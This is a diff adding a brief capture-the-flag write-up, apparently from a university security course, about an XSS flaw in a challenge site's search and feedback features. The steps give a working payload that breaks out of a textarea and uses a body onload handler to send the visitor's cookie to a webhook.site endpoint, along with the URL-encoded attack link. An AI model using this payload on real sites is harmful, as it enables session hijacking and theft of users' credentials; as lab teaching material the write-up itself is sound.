@@ -1,0 +1,14 @@
+# Challenge `Go on and censor my posts` writeup
+
+- **Vulnerability:** XSS
+- **Where:** in search and feedback
+- **Impact:** Allows execution of arbitrary script in site owner's browser
+
+## Steps to reproduce
+
+1. Create a request bin in **webhook.site**
+1. Create a script that requests the created endpoint and sends the user cookie as a query parameter:
+   `   </textarea><body onload=window.open("http://webhook.site/3cf170ec-fafe-4c0a-83be-50f34d4429f9?q="+document.cookie)>`.
+   This script leverages the use of inline script in an HTML body tag and the injection of the submitted text into client's HTML code which allows closing the \<textarea\>
+1. Insert into feedback URL bar after URL encoding `http://mustard.stt.rnl.tecnico.ulisboa.pt:22252/?search=%3C%2Ftextarea%3E%3Cbody%20onload%3Dwindow.open%28%22http%3A%2F%2Fwebhook.site%2F3cf170ec-fafe-4c0a-83be-50f34d4429f9%3Fq%3D%22%2Bdocument.cookie%29%3E` for the reviewer to access a page with a malicious search query. The description does not matter.
+1. Submit feedback and get the flag from webhook website.
